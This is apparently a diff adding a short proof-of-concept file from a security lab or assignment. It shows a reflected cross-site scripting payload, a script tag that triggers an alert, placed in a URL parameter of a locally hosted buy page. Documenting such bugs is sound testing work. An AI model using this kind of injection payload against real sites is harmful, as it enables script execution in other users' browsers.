@@ -1,0 +1,3 @@
+The GET request that triggers my xxs attack. Paste this into the url or send a curl request and the attack succeeds. See my description in bugs.txt for more. 
+
+http://127.0.0.1:8000/buy.html?director=<script>alert('xxs')</script>attacked%211 
